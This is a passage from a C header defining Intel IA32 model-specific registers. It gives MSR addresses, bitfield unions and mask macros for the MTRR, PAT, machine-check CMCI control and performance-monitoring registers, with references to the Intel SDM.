 /**
  * @defgroup IA32_MTRR_PHYSMASK \
  *           IA32_MTRR_PHYSMASK(n)
  *
  * IA32_MTRR_PHYSMASK(0-9).
  *
  * @remarks If CPUID.01H: EDX.MTRR[12] = 1
  * @see Vol3A[11.11.2.3(Variable Range MTRRs)]
  * @{
  */
typedef union
{
    struct
    {
        /**
         * [Bits 7:0] Specifies the memory type for the range.
         */
        UINT64 Type : 8;
#define IA32_MTRR_PHYSMASK_TYPE_BIT                                  0
#define IA32_MTRR_PHYSMASK_TYPE_FLAG                                 0xFF
#define IA32_MTRR_PHYSMASK_TYPE_MASK                                 0xFF
#define IA32_MTRR_PHYSMASK_TYPE(_)                                   (((_) >> 0) & 0xFF)
        UINT64 Reserved1 : 3;

        /**
         * [Bit 11] Enables the register pair when set; disables register pair when clear.
         */
        UINT64 Valid : 1;
#define IA32_MTRR_PHYSMASK_VALID_BIT                                 11
#define IA32_MTRR_PHYSMASK_VALID_FLAG                                0x800
#define IA32_MTRR_PHYSMASK_VALID_MASK                                0x01
#define IA32_MTRR_PHYSMASK_VALID(_)                                  (((_) >> 11) & 0x01)

        /**
         * [Bits 47:12] Specifies a mask (24 bits if the maximum physical address size is 36 bits, 28 bits if the maximum physical
         * address size is 40 bits). The mask determines the range of the region being mapped, according to the following
         * relationships:
         * - Address_Within_Range AND PhysMask = PhysBase AND PhysMask
         * - This value is extended by 12 bits at the low end to form the mask value.
         * - The width of the PhysMask field depends on the maximum physical address size supported by the processor.
         * CPUID.80000008H reports the maximum physical address size supported by the processor. If CPUID.80000008H is not
         * available, software may assume that the processor supports a 36-bit physical address size.
         *
         * @see Vol3A[11.11.3(Example Base and Mask Calculations)]
         */
        UINT64 PageFrameNumber : 36;
#define IA32_MTRR_PHYSMASK_PAGE_FRAME_NUMBER_BIT                     12
#define IA32_MTRR_PHYSMASK_PAGE_FRAME_NUMBER_FLAG                    0xFFFFFFFFF000
#define IA32_MTRR_PHYSMASK_PAGE_FRAME_NUMBER_MASK                    0xFFFFFFFFF
#define IA32_MTRR_PHYSMASK_PAGE_FRAME_NUMBER(_)                      (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved2 : 16;
    };

    UINT64 Flags;
} IA32_MTRR_PHYSMASK_REGISTER;

#define IA32_MTRR_PHYSMASK0                                          0x00000201
#define IA32_MTRR_PHYSMASK1                                          0x00000203
#define IA32_MTRR_PHYSMASK2                                          0x00000205
#define IA32_MTRR_PHYSMASK3                                          0x00000207
#define IA32_MTRR_PHYSMASK4                                          0x00000209
#define IA32_MTRR_PHYSMASK5                                          0x0000020B
#define IA32_MTRR_PHYSMASK6                                          0x0000020D
#define IA32_MTRR_PHYSMASK7                                          0x0000020F
#define IA32_MTRR_PHYSMASK8                                          0x00000211
#define IA32_MTRR_PHYSMASK9                                          0x00000213
/**
 * @}
 */

 /**
  * @defgroup IA32_MTRR_FIX \
  *           IA32_MTRR_FIX(x)
  *
  * IA32_MTRR_FIX(x).
  *
  * @remarks If CPUID.01H: EDX.MTRR[12] = 1
  * @see Vol3A[11.11.2.2(Fixed Range MTRRs)]
  * @{
  */
  /**
   * @defgroup IA32_MTRR_FIX64K \
   *           IA32_MTRR_FIX64K(x)
   *
   * IA32_MTRR_FIX64K(x).
   * @{
   */
#define IA32_MTRR_FIX64K_BASE                                        0x00000000
#define IA32_MTRR_FIX64K_SIZE                                        0x00010000
#define IA32_MTRR_FIX64K_00000                                       0x00000250
   /**
    * @}
    */

    /**
     * @defgroup IA32_MTRR_FIX16K \
     *           IA32_MTRR_FIX16K(x)
     *
     * IA32_MTRR_FIX16K(x).
     * @{
     */
#define IA32_MTRR_FIX16K_BASE                                        0x00080000
#define IA32_MTRR_FIX16K_SIZE                                        0x00004000
#define IA32_MTRR_FIX16K_80000                                       0x00000258
#define IA32_MTRR_FIX16K_A0000                                       0x00000259
     /**
      * @}
      */

      /**
       * @defgroup IA32_MTRR_FIX4K \
       *           IA32_MTRR_FIX4K(x)
       *
       * IA32_MTRR_FIX4K(x).
       * @{
       */
#define IA32_MTRR_FIX4K_BASE                                         0x000C0000
#define IA32_MTRR_FIX4K_SIZE                                         0x00001000
#define IA32_MTRR_FIX4K_C0000                                        0x00000268
#define IA32_MTRR_FIX4K_C8000                                        0x00000269
#define IA32_MTRR_FIX4K_D0000                                        0x0000026A
#define IA32_MTRR_FIX4K_D8000                                        0x0000026B
#define IA32_MTRR_FIX4K_E0000                                        0x0000026C
#define IA32_MTRR_FIX4K_E8000                                        0x0000026D
#define IA32_MTRR_FIX4K_F0000                                        0x0000026E
#define IA32_MTRR_FIX4K_F8000                                        0x0000026F
       /**
        * @}
        */

        /**
         * Architecture defined number of fixed range MTRRs (1 for 64k, 2 for 16k, 8 for 4k).
         */
#define IA32_MTRR_FIX_COUNT                                          ((1 + 2 + 8) * 8)

         /**
          * Architecture defined number of variable range MTRRs.
          */
#define IA32_MTRR_VARIABLE_COUNT                                     0x000000FF

          /**
           * A size of array to store all possible MTRRs.
           */
#define IA32_MTRR_COUNT                                              (IA32_MTRR_FIX_COUNT + IA32_MTRR_VARIABLE_COUNT)
           /**
            * @}
            */


            /**
             * IA32_PAT.
             *
             * @remarks If CPUID.01H: EDX.MTRR[16] = 1
             */
#define IA32_PAT                                                     0x00000277
typedef union
{
    struct
    {
        /**
         * [Bits 2:0] PA0.
         */
        UINT64 Pa0 : 3;
#define IA32_PAT_PA0_BIT                                             0
#define IA32_PAT_PA0_FLAG                                            0x07
#define IA32_PAT_PA0_MASK                                            0x07
#define IA32_PAT_PA0(_)                                              (((_) >> 0) & 0x07)
        UINT64 Reserved1 : 5;

        /**
         * [Bits 10:8] PA1.
         */
        UINT64 Pa1 : 3;
#define IA32_PAT_PA1_BIT                                             8
#define IA32_PAT_PA1_FLAG                                            0x700
#define IA32_PAT_PA1_MASK                                            0x07
#define IA32_PAT_PA1(_)                                              (((_) >> 8) & 0x07)
        UINT64 Reserved2 : 5;

        /**
         * [Bits 18:16] PA2.
         */
        UINT64 Pa2 : 3;
#define IA32_PAT_PA2_BIT                                             16
#define IA32_PAT_PA2_FLAG                                            0x70000
#define IA32_PAT_PA2_MASK                                            0x07
#define IA32_PAT_PA2(_)                                              (((_) >> 16) & 0x07)
        UINT64 Reserved3 : 5;

        /**
         * [Bits 26:24] PA3.
         */
        UINT64 Pa3 : 3;
#define IA32_PAT_PA3_BIT                                             24
#define IA32_PAT_PA3_FLAG                                            0x7000000
#define IA32_PAT_PA3_MASK                                            0x07
#define IA32_PAT_PA3(_)                                              (((_) >> 24) & 0x07)
        UINT64 Reserved4 : 5;

        /**
         * [Bits 34:32] PA4.
         */
        UINT64 Pa4 : 3;
#define IA32_PAT_PA4_BIT                                             32
#define IA32_PAT_PA4_FLAG                                            0x700000000
#define IA32_PAT_PA4_MASK                                            0x07
#define IA32_PAT_PA4(_)                                              (((_) >> 32) & 0x07)
        UINT64 Reserved5 : 5;

        /**
         * [Bits 42:40] PA5.
         */
        UINT64 Pa5 : 3;
#define IA32_PAT_PA5_BIT                                             40
#define IA32_PAT_PA5_FLAG                                            0x70000000000
#define IA32_PAT_PA5_MASK                                            0x07
#define IA32_PAT_PA5(_)                                              (((_) >> 40) & 0x07)
        UINT64 Reserved6 : 5;

        /**
         * [Bits 50:48] PA6.
         */
        UINT64 Pa6 : 3;
#define IA32_PAT_PA6_BIT                                             48
#define IA32_PAT_PA6_FLAG                                            0x7000000000000
#define IA32_PAT_PA6_MASK                                            0x07
#define IA32_PAT_PA6(_)                                              (((_) >> 48) & 0x07)
        UINT64 Reserved7 : 5;

        /**
         * [Bits 58:56] PA7.
         */
        UINT64 Pa7 : 3;
#define IA32_PAT_PA7_BIT                                             56
#define IA32_PAT_PA7_FLAG                                            0x700000000000000
#define IA32_PAT_PA7_MASK                                            0x07
#define IA32_PAT_PA7(_)                                              (((_) >> 56) & 0x07)
        UINT64 Reserved8 : 5;
    };

    UINT64 Flags;
} IA32_PAT_REGISTER;

/**
 * @defgroup IA32_MC_CTL2 \
 *           IA32_MC(i)_CTL2
 *
 * MSR to enable/disable CMCI capability for bank n.
 *
 * @remarks If IA32_MCG_CAP[10] = 1 && IA32_MCG_CAP[7:0] > n
 * @see Vol3B[15.3.2.5(IA32_MCi_CTL2 MSRs)]
 * @{
 */
#define IA32_MC0_CTL2                                                0x00000280
#define IA32_MC1_CTL2                                                0x00000281
#define IA32_MC2_CTL2                                                0x00000282
#define IA32_MC3_CTL2                                                0x00000283
#define IA32_MC4_CTL2                                                0x00000284
#define IA32_MC5_CTL2                                                0x00000285
#define IA32_MC6_CTL2                                                0x00000286
#define IA32_MC7_CTL2                                                0x00000287
#define IA32_MC8_CTL2                                                0x00000288
#define IA32_MC9_CTL2                                                0x00000289
#define IA32_MC10_CTL2                                               0x0000028A
#define IA32_MC11_CTL2                                               0x0000028B
#define IA32_MC12_CTL2                                               0x0000028C
#define IA32_MC13_CTL2                                               0x0000028D
#define IA32_MC14_CTL2                                               0x0000028E
#define IA32_MC15_CTL2                                               0x0000028F
#define IA32_MC16_CTL2                                               0x00000290
#define IA32_MC17_CTL2                                               0x00000291
#define IA32_MC18_CTL2                                               0x00000292
#define IA32_MC19_CTL2                                               0x00000293
#define IA32_MC20_CTL2                                               0x00000294
#define IA32_MC21_CTL2                                               0x00000295
#define IA32_MC22_CTL2                                               0x00000296
#define IA32_MC23_CTL2                                               0x00000297
#define IA32_MC24_CTL2                                               0x00000298
#define IA32_MC25_CTL2                                               0x00000299
#define IA32_MC26_CTL2                                               0x0000029A
#define IA32_MC27_CTL2                                               0x0000029B
#define IA32_MC28_CTL2                                               0x0000029C
#define IA32_MC29_CTL2                                               0x0000029D
#define IA32_MC30_CTL2                                               0x0000029E
#define IA32_MC31_CTL2                                               0x0000029F
typedef union
{
    struct
    {
        /**
         * [Bits 14:0] Corrected error count threshold.
         */
        UINT64 CorrectedErrorCountThreshold : 15;
#define IA32_MC_CTL2_CORRECTED_ERROR_COUNT_THRESHOLD_BIT             0
#define IA32_MC_CTL2_CORRECTED_ERROR_COUNT_THRESHOLD_FLAG            0x7FFF
#define IA32_MC_CTL2_CORRECTED_ERROR_COUNT_THRESHOLD_MASK            0x7FFF
#define IA32_MC_CTL2_CORRECTED_ERROR_COUNT_THRESHOLD(_)              (((_) >> 0) & 0x7FFF)
        UINT64 Reserved1 : 15;

        /**
         * [Bit 30] CMCI_EN.
         */
        UINT64 CmciEn : 1;
#define IA32_MC_CTL2_CMCI_EN_BIT                                     30
#define IA32_MC_CTL2_CMCI_EN_FLAG                                    0x40000000
#define IA32_MC_CTL2_CMCI_EN_MASK                                    0x01
#define IA32_MC_CTL2_CMCI_EN(_)                                      (((_) >> 30) & 0x01)
        UINT64 Reserved2 : 33;
    };

    UINT64 Flags;
} IA32_MC_CTL2_REGISTER;

/**
 * @}
 */


 /**
  * IA32_MTRR_DEF_TYPE.
  *
  * @remarks If CPUID.01H: EDX.MTRR[12] = 1
  */
#define IA32_MTRR_DEF_TYPE                                           0x000002FF
typedef union
{
    struct
    {
        /**
         * [Bits 2:0] Default Memory Type.
         */
        UINT64 DefaultMemoryType : 3;
#define IA32_MTRR_DEF_TYPE_DEFAULT_MEMORY_TYPE_BIT                   0
#define IA32_MTRR_DEF_TYPE_DEFAULT_MEMORY_TYPE_FLAG                  0x07
#define IA32_MTRR_DEF_TYPE_DEFAULT_MEMORY_TYPE_MASK                  0x07
#define IA32_MTRR_DEF_TYPE_DEFAULT_MEMORY_TYPE(_)                    (((_) >> 0) & 0x07)
        UINT64 Reserved1 : 7;

        /**
         * [Bit 10] Fixed Range MTRR Enable.
         */
        UINT64 FixedRangeMtrrEnable : 1;
#define IA32_MTRR_DEF_TYPE_FIXED_RANGE_MTRR_ENABLE_BIT               10
#define IA32_MTRR_DEF_TYPE_FIXED_RANGE_MTRR_ENABLE_FLAG              0x400
#define IA32_MTRR_DEF_TYPE_FIXED_RANGE_MTRR_ENABLE_MASK              0x01
#define IA32_MTRR_DEF_TYPE_FIXED_RANGE_MTRR_ENABLE(_)                (((_) >> 10) & 0x01)

        /**
         * [Bit 11] MTRR Enable.
         */
        UINT64 MtrrEnable : 1;
#define IA32_MTRR_DEF_TYPE_MTRR_ENABLE_BIT                           11
#define IA32_MTRR_DEF_TYPE_MTRR_ENABLE_FLAG                          0x800
#define IA32_MTRR_DEF_TYPE_MTRR_ENABLE_MASK                          0x01
#define IA32_MTRR_DEF_TYPE_MTRR_ENABLE(_)                            (((_) >> 11) & 0x01)
        UINT64 Reserved2 : 52;
    };

    UINT64 Flags;
} IA32_MTRR_DEF_TYPE_REGISTER;

/**
 * @defgroup IA32_FIXED_CTR \
 *           IA32_FIXED_CTR(n)
 *
 * Fixed-Function Performance Counter n.
 *
 * @remarks If CPUID.0AH: EDX[4:0] > n
 * @{
 */
 /**
  * Counts Instr_Retired.Any.
  */
#define IA32_FIXED_CTR0                                              0x00000309

  /**
   * Counts CPU_CLK_Unhalted.Core
   */
#define IA32_FIXED_CTR1                                              0x0000030A

   /**
    * Counts CPU_CLK_Unhalted.Ref
    */
#define IA32_FIXED_CTR2                                              0x0000030B
    /**
     * @}
     */


     /**
      * Read Only MSR that enumerates the existence of performance monitoring features.
      *
      * @remarks If CPUID.01H: ECX[15] = 1
      */
#define IA32_PERF_CAPABILITIES                                       0x00000345
typedef union
{
    struct
    {
        /**
         * [Bits 5:0] LBR format.
         */
        UINT64 LbrFormat : 6;
#define IA32_PERF_CAPABILITIES_LBR_FORMAT_BIT                        0
#define IA32_PERF_CAPABILITIES_LBR_FORMAT_FLAG                       0x3F
#define IA32_PERF_CAPABILITIES_LBR_FORMAT_MASK                       0x3F
#define IA32_PERF_CAPABILITIES_LBR_FORMAT(_)                         (((_) >> 0) & 0x3F)

        /**
         * [Bit 6] PEBS Trap.
         */
        UINT64 PebsTrap : 1;
#define IA32_PERF_CAPABILITIES_PEBS_TRAP_BIT                         6
#define IA32_PERF_CAPABILITIES_PEBS_TRAP_FLAG                        0x40
#define IA32_PERF_CAPABILITIES_PEBS_TRAP_MASK                        0x01
#define IA32_PERF_CAPABILITIES_PEBS_TRAP(_)                          (((_) >> 6) & 0x01)

        /**
         * [Bit 7] PEBSSaveArchRegs.
         */
        UINT64 PebsSaveArchRegs : 1;
#define IA32_PERF_CAPABILITIES_PEBS_SAVE_ARCH_REGS_BIT               7
#define IA32_PERF_CAPABILITIES_PEBS_SAVE_ARCH_REGS_FLAG              0x80
#define IA32_PERF_CAPABILITIES_PEBS_SAVE_ARCH_REGS_MASK              0x01
#define IA32_PERF_CAPABILITIES_PEBS_SAVE_ARCH_REGS(_)                (((_) >> 7) & 0x01)

        /**
         * [Bits 11:8] PEBS Record Format.
         */
        UINT64 PebsRecordFormat : 4;
#define IA32_PERF_CAPABILITIES_PEBS_RECORD_FORMAT_BIT                8
#define IA32_PERF_CAPABILITIES_PEBS_RECORD_FORMAT_FLAG               0xF00
#define IA32_PERF_CAPABILITIES_PEBS_RECORD_FORMAT_MASK               0x0F
#define IA32_PERF_CAPABILITIES_PEBS_RECORD_FORMAT(_)                 (((_) >> 8) & 0x0F)

        /**
         * [Bit 12] Freeze while SMM is supported.
         */
        UINT64 FreezeWhileSmmIsSupported : 1;
#define IA32_PERF_CAPABILITIES_FREEZE_WHILE_SMM_IS_SUPPORTED_BIT     12
#define IA32_PERF_CAPABILITIES_FREEZE_WHILE_SMM_IS_SUPPORTED_FLAG    0x1000
#define IA32_PERF_CAPABILITIES_FREEZE_WHILE_SMM_IS_SUPPORTED_MASK    0x01
#define IA32_PERF_CAPABILITIES_FREEZE_WHILE_SMM_IS_SUPPORTED(_)      (((_) >> 12) & 0x01)

        /**
         * [Bit 13] Full width of counter writable via IA32_A_PMCx.
         */
        UINT64 FullWidthCounterWrite : 1;
#define IA32_PERF_CAPABILITIES_FULL_WIDTH_COUNTER_WRITE_BIT          13
#define IA32_PERF_CAPABILITIES_FULL_WIDTH_COUNTER_WRITE_FLAG         0x2000
#define IA32_PERF_CAPABILITIES_FULL_WIDTH_COUNTER_WRITE_MASK         0x01
#define IA32_PERF_CAPABILITIES_FULL_WIDTH_COUNTER_WRITE(_)           (((_) >> 13) & 0x01)
        UINT64 Reserved1 : 50;
    };

    UINT64 Flags;
} IA32_PERF_CAPABILITIES_REGISTER;


/**
 * @brief Fixed-Function Performance Counter Control <b>(R/W)</b>
 *
 * Fixed-Function Performance Counter Control. Counter increments while the results of ANDing respective enable bit in
 * IA32_PERF_GLOBAL_CTRL with the corresponding OS or USR bits in this MSR is true.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 1
 */
#define IA32_FIXED_CTR_CTRL                                          0x0000038D
typedef union
{
    struct
    {
        /**
         * [Bit 0] EN0_OS: Enable Fixed Counter 0 to count while CPL = 0.
         */
        UINT64 En0Os : 1;
#define IA32_FIXED_CTR_CTRL_EN0_OS_BIT                               0
#define IA32_FIXED_CTR_CTRL_EN0_OS_FLAG                              0x01
#define IA32_FIXED_CTR_CTRL_EN0_OS_MASK                              0x01
#define IA32_FIXED_CTR_CTRL_EN0_OS(_)                                (((_) >> 0) & 0x01)

        /**
         * [Bit 1] EN0_Usr: Enable Fixed Counter 0 to count while CPL > 0.
         */
        UINT64 En0Usr : 1;
#define IA32_FIXED_CTR_CTRL_EN0_USR_BIT                              1
#define IA32_FIXED_CTR_CTRL_EN0_USR_FLAG                             0x02
#define IA32_FIXED_CTR_CTRL_EN0_USR_MASK                             0x01
#define IA32_FIXED_CTR_CTRL_EN0_USR(_)                               (((_) >> 1) & 0x01)

        /**
         * [Bit 2] AnyThread: When set to 1, it enables counting the associated event conditions occurring across all logical
         * processors sharing a processor core. When set to 0, the counter only increments the associated event conditions
         * occurring in the logical processor which programmed the MSR.
         */
        UINT64 AnyThread0 : 1;
#define IA32_FIXED_CTR_CTRL_ANY_THREAD0_BIT                          2
#define IA32_FIXED_CTR_CTRL_ANY_THREAD0_FLAG                         0x04
#define IA32_FIXED_CTR_CTRL_ANY_THREAD0_MASK                         0x01
#define IA32_FIXED_CTR_CTRL_ANY_THREAD0(_)                           (((_) >> 2) & 0x01)

        /**
         * [Bit 3] EN0_PMI: Enable PMI when fixed counter 0 overflows.
         */
        UINT64 En0Pmi : 1;
#define IA32_FIXED_CTR_CTRL_EN0_PMI_BIT                              3
#define IA32_FIXED_CTR_CTRL_EN0_PMI_FLAG                             0x08
#define IA32_FIXED_CTR_CTRL_EN0_PMI_MASK                             0x01
#define IA32_FIXED_CTR_CTRL_EN0_PMI(_)                               (((_) >> 3) & 0x01)

        /**
         * [Bit 4] EN1_OS: Enable Fixed Counter 1 to count while CPL = 0.
         */
        UINT64 En1Os : 1;
#define IA32_FIXED_CTR_CTRL_EN1_OS_BIT                               4
#define IA32_FIXED_CTR_CTRL_EN1_OS_FLAG                              0x10
#define IA32_FIXED_CTR_CTRL_EN1_OS_MASK                              0x01
#define IA32_FIXED_CTR_CTRL_EN1_OS(_)                                (((_) >> 4) & 0x01)

        /**
         * [Bit 5] EN1_Usr: Enable Fixed Counter 1 to count while CPL > 0.
         */
        UINT64 En1Usr : 1;
#define IA32_FIXED_CTR_CTRL_EN1_USR_BIT                              5
#define IA32_FIXED_CTR_CTRL_EN1_USR_FLAG                             0x20
#define IA32_FIXED_CTR_CTRL_EN1_USR_MASK                             0x01
#define IA32_FIXED_CTR_CTRL_EN1_USR(_)                               (((_) >> 5) & 0x01)

        /**
         * [Bit 6] AnyThread: When set to 1, it enables counting the associated event conditions occurring across all logical
         * processors sharing a processor core. When set to 0, the counter only increments the associated event conditions
         * occurring in the logical processor which programmed the MSR.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 2
         */
        UINT64 AnyThread1 : 1;
#define IA32_FIXED_CTR_CTRL_ANY_THREAD1_BIT                          6
#define IA32_FIXED_CTR_CTRL_ANY_THREAD1_FLAG                         0x40
#define IA32_FIXED_CTR_CTRL_ANY_THREAD1_MASK                         0x01
#define IA32_FIXED_CTR_CTRL_ANY_THREAD1(_)                           (((_) >> 6) & 0x01)

        /**
         * [Bit 7] EN1_PMI: Enable PMI when fixed counter 1 overflows.
         */
        UINT64 En1Pmi : 1;
#define IA32_FIXED_CTR_CTRL_EN1_PMI_BIT                              7
#define IA32_FIXED_CTR_CTRL_EN1_PMI_FLAG                             0x80
#define IA32_FIXED_CTR_CTRL_EN1_PMI_MASK                             0x01
#define IA32_FIXED_CTR_CTRL_EN1_PMI(_)                               (((_) >> 7) & 0x01)

        /**
         * [Bit 8] EN2_OS: Enable Fixed Counter 2 to count while CPL = 0.
         */
        UINT64 En2Os : 1;
#define IA32_FIXED_CTR_CTRL_EN2_OS_BIT                               8
#define IA32_FIXED_CTR_CTRL_EN2_OS_FLAG                              0x100
#define IA32_FIXED_CTR_CTRL_EN2_OS_MASK                              0x01
#define IA32_FIXED_CTR_CTRL_EN2_OS(_)                                (((_) >> 8) & 0x01)

        /**
         * [Bit 9] EN2_Usr: Enable Fixed Counter 2 to count while CPL > 0.
         */
        UINT64 En2Usr : 1;
#define IA32_FIXED_CTR_CTRL_EN2_USR_BIT                              9
#define IA32_FIXED_CTR_CTRL_EN2_USR_FLAG                             0x200
#define IA32_FIXED_CTR_CTRL_EN2_USR_MASK                             0x01
#define IA32_FIXED_CTR_CTRL_EN2_USR(_)                               (((_) >> 9) & 0x01)

        /**
         * [Bit 10] AnyThread: When set to 1, it enables counting the associated event conditions occurring across all logical
         * processors sharing a processor core. When set to 0, the counter only increments the associated event conditions
         * occurring in the logical processor which programmed the MSR.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 2
         */
        UINT64 AnyThread2 : 1;
#define IA32_FIXED_CTR_CTRL_ANY_THREAD2_BIT                          10
#define IA32_FIXED_CTR_CTRL_ANY_THREAD2_FLAG                         0x400
#define IA32_FIXED_CTR_CTRL_ANY_THREAD2_MASK                         0x01
#define IA32_FIXED_CTR_CTRL_ANY_THREAD2(_)                           (((_) >> 10) & 0x01)

        /**
         * [Bit 11] EN2_PMI: Enable PMI when fixed counter 2 overflows.
         */
        UINT64 En2Pmi : 1;
#define IA32_FIXED_CTR_CTRL_EN2_PMI_BIT                              11
#define IA32_FIXED_CTR_CTRL_EN2_PMI_FLAG                             0x800
#define IA32_FIXED_CTR_CTRL_EN2_PMI_MASK                             0x01
#define IA32_FIXED_CTR_CTRL_EN2_PMI(_)                               (((_) >> 11) & 0x01)
        UINT64 Reserved1 : 52;
    };

    UINT64 Flags;
} IA32_FIXED_CTR_CTRL_REGISTER;


/**
 * Global Performance Counter Status.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 0
 */
#define IA32_PERF_GLOBAL_STATUS                                      0x0000038E
typedef union
{
    struct
    {
        /**
         * [Bit 0] Ovf_PMC0: Overflow status of IA32_PMC0.
         *
         * @remarks If CPUID.0AH: EAX[15:8] > 0
         */
        UINT64 OvfPmc0 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC0_BIT                         0
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC0_FLAG                        0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC0_MASK                        0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC0(_)                          (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Ovf_PMC1: Overflow status of IA32_PMC1.
         *
         * @remarks If CPUID.0AH: EAX[15:8] > 1
         */
        UINT64 OvfPmc1 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC1_BIT                         1
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC1_FLAG                        0x02
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC1_MASK                        0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC1(_)                          (((_) >> 1) & 0x01)

        /**
         * [Bit 2] Ovf_PMC2: Overflow status of IA32_PMC2.
         *
         * @remarks If CPUID.0AH: EAX[15:8] > 2
         */
        UINT64 OvfPmc2 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC2_BIT                         2
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC2_FLAG                        0x04
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC2_MASK                        0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC2(_)                          (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Ovf_PMC3: Overflow status of IA32_PMC3.
         *
         * @remarks If CPUID.0AH: EAX[15:8] > 3
         */
        UINT64 OvfPmc3 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC3_BIT                         3
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC3_FLAG                        0x08
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC3_MASK                        0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_PMC3(_)                          (((_) >> 3) & 0x01)
        UINT64 Reserved1 : 28;

        /**
         * [Bit 32] Ovf_FixedCtr0: Overflow status of IA32_FIXED_CTR0.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 1
         */
        UINT64 OvfFixedctr0 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR0_BIT                    32
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR0_FLAG                   0x100000000
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR0_MASK                   0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR0(_)                     (((_) >> 32) & 0x01)

        /**
         * [Bit 33] Ovf_FixedCtr1: Overflow status of IA32_FIXED_CTR1.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 1
         */
        UINT64 OvfFixedctr1 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR1_BIT                    33
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR1_FLAG                   0x200000000
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR1_MASK                   0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR1(_)                     (((_) >> 33) & 0x01)

        /**
         * [Bit 34] Ovf_FixedCtr2: Overflow status of IA32_FIXED_CTR2.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 1
         */
        UINT64 OvfFixedctr2 : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR2_BIT                    34
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR2_FLAG                   0x400000000
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR2_MASK                   0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_FIXEDCTR2(_)                     (((_) >> 34) & 0x01)
        UINT64 Reserved2 : 20;

        /**
         * [Bit 55] Trace_ToPA_PMI: A PMI occurred due to a ToPA entry memory buffer that was completely filled.
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1) && IA32_RTIT_CTL.ToPA = 1
         */
        UINT64 TraceTopaPmi : 1;
#define IA32_PERF_GLOBAL_STATUS_TRACE_TOPA_PMI_BIT                   55
#define IA32_PERF_GLOBAL_STATUS_TRACE_TOPA_PMI_FLAG                  0x80000000000000
#define IA32_PERF_GLOBAL_STATUS_TRACE_TOPA_PMI_MASK                  0x01
#define IA32_PERF_GLOBAL_STATUS_TRACE_TOPA_PMI(_)                    (((_) >> 55) & 0x01)
        UINT64 Reserved3 : 2;

        /**
         * [Bit 58] LBR_Frz. LBRs are frozen due to:
         * * IA32_DEBUGCTL.FREEZE_LBR_ON_PMI=1.
         * * The LBR stack overflowed.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 LbrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_LBR_FRZ_BIT                          58
#define IA32_PERF_GLOBAL_STATUS_LBR_FRZ_FLAG                         0x400000000000000
#define IA32_PERF_GLOBAL_STATUS_LBR_FRZ_MASK                         0x01
#define IA32_PERF_GLOBAL_STATUS_LBR_FRZ(_)                           (((_) >> 58) & 0x01)

        /**
         * [Bit 59] CTR_Frz. Performance counters in the core PMU are frozen due to:
         * * IA32_DEBUGCTL.FREEZE_PERFMON_ON_PMI=1.
         * * One or more core PMU counters overflowed.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 CtrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_CTR_FRZ_BIT                          59
#define IA32_PERF_GLOBAL_STATUS_CTR_FRZ_FLAG                         0x800000000000000
#define IA32_PERF_GLOBAL_STATUS_CTR_FRZ_MASK                         0x01
#define IA32_PERF_GLOBAL_STATUS_CTR_FRZ(_)                           (((_) >> 59) & 0x01)

        /**
         * [Bit 60] ASCI: Data in the performance counters in the core PMU may include contributions from the direct or indirect
         * operation Intel SGX to protect an enclave.
         *
         * @remarks If CPUID.(EAX=07H, ECX=0):EBX[2] = 1
         */
        UINT64 Asci : 1;
#define IA32_PERF_GLOBAL_STATUS_ASCI_BIT                             60
#define IA32_PERF_GLOBAL_STATUS_ASCI_FLAG                            0x1000000000000000
#define IA32_PERF_GLOBAL_STATUS_ASCI_MASK                            0x01
#define IA32_PERF_GLOBAL_STATUS_ASCI(_)                              (((_) >> 60) & 0x01)

        /**
         * [Bit 61] Uncore counter overflow status.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 2
         */
        UINT64 OvfUncore : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_UNCORE_BIT                       61
#define IA32_PERF_GLOBAL_STATUS_OVF_UNCORE_FLAG                      0x2000000000000000
#define IA32_PERF_GLOBAL_STATUS_OVF_UNCORE_MASK                      0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_UNCORE(_)                        (((_) >> 61) & 0x01)

        /**
         * [Bit 62] OvfBuf: DS SAVE area Buffer overflow status.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 0
         */
